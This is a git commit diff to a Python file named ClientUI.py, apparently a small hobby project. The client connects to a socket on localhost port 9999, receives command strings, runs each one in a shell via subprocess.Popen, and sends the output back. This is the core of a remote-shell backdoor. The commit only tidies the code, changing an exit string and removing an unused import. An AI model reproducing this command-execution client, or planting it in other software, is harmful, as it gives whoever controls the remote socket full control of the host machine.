f1d79469e00f59d56c99838c1a04e39e60dea327
σ`∀´)σ <hitdoomed@gmail.com>
2020-10-08 11:38:41 +0800

    Update ClientUI.py

--- ClientUI.py
+++ ClientUI.py
@@ -1,18 +1,18 @@
 import socket
-import os
 import subprocess
 
+
 ip_port = ('127.0.0.1', 9999)
-s = socket.socket()  
+s = socket.socket()
+print(s)
 s.connect(ip_port)
 
-while True:   
+
+while True:
     re = s.recv(2048).decode()
-    if re =='exit && echo [+] Command Request Done!':
+    if re =='echo [+] Command Send Done! && exit':
         s.close()
         break
-#    elif (os.system(re)) != 0:
-#        s.send(("no cammand").encode("big5"))
     elif re != '':
         a = (subprocess.Popen(re,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,close_fds=True))
         a.wait()
@@ -22,3 +22,5 @@ while True:
         s.send(b)
 
 s.close()
+
+
